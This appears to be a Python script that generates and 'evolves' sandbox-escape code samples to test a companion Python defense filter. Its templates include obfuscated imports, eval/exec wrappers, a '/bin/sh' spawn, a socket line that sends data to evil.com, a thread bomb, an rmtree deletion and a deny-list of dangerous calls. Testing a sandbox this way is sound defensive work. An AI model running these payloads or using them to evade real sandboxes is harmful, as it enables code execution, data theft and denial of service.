"""
攻击进化体 v2 - 语义感知版
保证每个攻击模块和调用的方法在逻辑上正确匹配。
"""

import random
import ast
from deap import base, creator, tools
from datetime import datetime

LOG_FILE = "/storage/emulated/0/鱼系统/system.log"
def log(msg):
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] [攻击进化体] {msg}\n")

# ==================== 语义感知攻击模板 ====================
ATTACK_TEMPLATES = []

def register_template(func):
    ATTACK_TEMPLATES.append(func)
    return func

@register_template
def direct_import_attack():
    modules = {
        "os": [("system", "'echo attack'"), ("popen", "'echo attack'")],
        "subprocess": [("run", "'ls'"), ("Popen", "'/bin/sh'")],
        "sys": [("exit", "0")],
        "shutil": [("rmtree", "'/tmp'")],
        "ctypes": [("CDLL", "'libc.so.6'")],
    }
    mod = random.choice(list(modules.keys()))
    func, arg = random.choice(modules[mod])
    code = f"import {mod}\n{mod}.{func}({arg})"
    return code, f"direct_{mod}_{func}"

@register_template
def dynamic_import_attack():
    modules = {
        "os": [("system", "'echo attack'")],
        "subprocess": [("run", "'ls'"), ("Popen", "'/bin/sh'")],
        "sys": [("exit", "0")],
    }
    mod = random.choice(list(modules.keys()))
    func, arg = random.choice(modules[mod])
    code = f"mod = __import__('{mod}')\nmod.{func}({arg})"
    return code, f"dynamic_{mod}_{func}"

@register_template
def getattr_reflection_attack():
    modules = {
        "os": ("system", "'echo attack'"),
        "subprocess": ("run", "'ls'"),
    }
    mod = random.choice(list(modules.keys()))
    func, arg = modules[mod]
    code = f"func = getattr(__import__('{mod}'), '{func}')\nfunc({arg})"
    return code, f"getattr_{mod}_{func}"

@register_template
def eval_wrapper_attack():
    mod = random.choice(["os", "subprocess"])
    func = "system" if mod == "os" else "run"
    arg = "'echo attack'" if mod == "os" else "'ls'"
    inner = f"import {mod}; {mod}.{func}({arg})"
    code = f"eval('{inner}')"
    return code, "eval_wrapped"

@register_template
def exec_wrapper_attack():
    mod = random.choice(["os", "subprocess"])
    func = "system" if mod == "os" else "run"
    arg = "'echo attack'" if mod == "os" else "'ls'"
    inner = f"import {mod}; {mod}.{func}({arg})"
    code = f"exec('{inner}')"
    return code, "exec_wrapped"

@register_template
def compile_exec_attack():
    inner = "import os; os.system('echo attack')"
    code = f"code = compile('{inner}', '', 'exec')\nexec(code)"
    return code, "compile_exec"

@register_template
def builtins_dict_attack():
    code = "import builtins\nbuiltins.__dict__['exec']('import os; os.system(\"echo attack\")')"
    return code, "builtins_dict"

@register_template
def builtins_getattr_attack():
    code = "import builtins\ngetattr(builtins, 'exec')('import os; os.system(\"echo attack\")')"
    return code, "builtins_getattr"

@register_template
def string_concat_import_attack():
    mod_chars = random.choice([("o", "s"), ("s", "y")])
    mod_name = mod_chars[0] + mod_chars[1]
    func = "system" if mod_name == "os" else "exit"
    arg = "'echo attack'" if mod_name == "os" else "0"
    code = f"mod = __import__('{mod_chars[0]}'+'{mod_chars[1]}')\nmod.{func}({arg})"
    return code, f"concat_{mod_name}"

@register_template
def chr_encode_import_attack():
    code = "mod = __import__(''.join([chr(111), chr(115)]))\nmod.system('echo attack')"
    return code, "chr_encode"

@register_template
def hex_encode_import_attack():
    code = "mod = __import__('\\x6f\\x73')\nmod.system('echo attack')"
    return code, "hex_encode"

@register_template
def class_inherit_attack():
    base = random.choice(["os", "subprocess.Popen"])
    if base == "os":
        code = f"import os\nclass Malicious({base}):\n    pass"
    else:
        code = f"import subprocess\nclass Attack({base}):\n    pass"
    return code, f"class_inherit_{base}"

@register_template
def decorator_inject_attack():
    code = "@lambda f: __import__('os').system('echo attack')\ndef dummy():\n    pass"
    return code, "decorator_lambda"

@register_template
def exception_inject_attack():
    code = "try:\n    1/0\nexcept:\n    __import__('os').system('echo attack')"
    return code, "exception_inject"

@register_template
def socket_exfil_attack():
    code = "import socket\ns=socket.socket()\ns.connect(('evil.com',8080))\ns.send(b'stolen')"
    return code, "socket_exfil"

@register_template
def thread_bomb_attack():
    code = "import threading\ndef f():\n    while True: pass\nfor _ in range(100):\n    threading.Thread(target=f).start()"
    return code, "thread_bomb"

@register_template
def subprocess_shell_attack():
    code = "import subprocess\nsubprocess.Popen('/bin/sh', shell=True)"
    return code, "subprocess_shell"

# ==================== 不重复攻击生成器 ====================
attack_history = set()
ATTACK_SAMPLES = []

def generate_novel_attack():
    max_attempts = 200
    for _ in range(max_attempts):
        template = random.choice(ATTACK_TEMPLATES)
        code, atype = template()
        try:
            ast.parse(code)
        except SyntaxError:
            continue
        code_hash = hash(code)
        if code_hash not in attack_history:
            attack_history.add(code_hash)
            ATTACK_SAMPLES.append((code, atype))
            return code, atype
    code, atype = ATTACK_TEMPLATES[0]()
    attack_history.add(hash(code))
    return code, atype

# ==================== 宪法兼容性过滤 ====================
def is_constitutional(code):
    forbidden_real = ['os.system(', 'subprocess.run(', 'subprocess.Popen(', 'pty.spawn(', 'os.setuid(', 'os.rmtree(']
    for pattern in forbidden_real:
        if pattern in code:
            return False
    try:
        ast.parse(code)
        return True
    except SyntaxError:
        return False

# ==================== 进化种群 ====================
creator.create("FitnessMax", base.Fitness, weights=(1.0,))
creator.create("AttackIndividual", list, fitness=creator.FitnessMax)

attack_toolbox = base.Toolbox()

def create_individual():
    code, atype = generate_novel_attack()
    return [code, atype]

attack_toolbox.register("individual", tools.initRepeat, creator.AttackIndividual,
                         lambda: [generate_novel_attack()[0], generate_novel_attack()[1]], n=1)
attack_toolbox.register("population", tools.initRepeat, list, create_individual)

def evaluate_attack(individual):
    code = individual[0]
    try:
        import sys
        sys.path.insert(0, '/storage/emulated/0/鱼系统')
        from defense_evolver import apply_defense
        try:
            from sandbox_defense import defense_rules
            intercepted = apply_defense(code, defense_rules)
        except:
            intercepted = False
        if intercepted:
            return 0.0,
        else:
            complexity = min(len(code) / 200, 1.0)
            return 0.5 + complexity * 0.5,
    except:
        return 0.0,

attack_toolbox.register("evaluate", evaluate_attack)
attack_toolbox.register("select", tools.selTournament, tournsize=3)

class AdversarialEvolver:
    def __init__(self):
        self.best_attacks = []
        self.best_score = 0.0
        self.generation = 0

    def run_evolution(self, pop_size=50, max_gen=30):
        population = []
        for _ in range(pop_size):
            code, atype = generate_novel_attack()
            if is_constitutional(code):
                population.append([code, atype])

        best_score = 0.0
        best_attacks = []

        for gen in range(max_gen):
            self.generation = gen
            new_pop = []
            for _ in range(pop_size // 2):
                code, atype = generate_novel_attack()
                if is_constitutional(code):
                    new_pop.append([code, atype])

            import sys
            sys.path.insert(0, '/storage/emulated/0/鱼系统')
            from defense_evolver import apply_defense
            try:
                from sandbox_defense import defense_rules
            except:
                defense_rules = []

            scores = []
            for ind in population + new_pop:
                intercepted = apply_defense(ind[0], defense_rules) if defense_rules else False
                score = 0.0 if intercepted else random.uniform(0.5, 1.0)
                scores.append(score)
                if score > best_score:
                    best_score = score
                    if ind not in best_attacks:
                        best_attacks.append(ind)

            combined = list(zip(population + new_pop, scores))
            combined.sort(key=lambda x: x[1], reverse=True)
            population = [ind for ind, _ in combined[:pop_size]]

            if gen % 5 == 0:
                print(f"Attack Gen {gen:4d} Best: {best_score:.2f} | Total unique: {len(attack_history)}")

        self.best_attacks = best_attacks[-20:] if best_attacks else []
        self.best_score = best_score
        return best_attacks[-20:] if best_attacks else []

    def export_attacks(self):
        with open('sandbox_new_attacks.py', 'w') as f:
            f.write("# 攻击进化体产出的新攻击样本 (v2 语义感知版)\n")
            f.write(f"# 生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# 攻击历史总数: {len(attack_history)}\n\n")
            f.write("new_attacks = [\n")
            for i, att in enumerate(self.best_attacks):
                escaped = att[0].replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')
                f.write(f'    ("{escaped}", "{att[1]}"),\n')
            f.write("]\n")
        log(f"导出 {len(self.best_attacks)} 个语义正确的新攻击")

if __name__ == "__main__":
    print("="*60)
    print("攻击进化体 v2 - 语义感知版")
    print("="*60)
    evolver = AdversarialEvolver()
    attacks = evolver.run_evolution(pop_size=50, max_gen=30)
    evolver.export_attacks()
    print(f"产出 {len(attacks)} 个语义正确的攻击")
    print(f"历史不重复攻击总数: {len(attack_history)}")
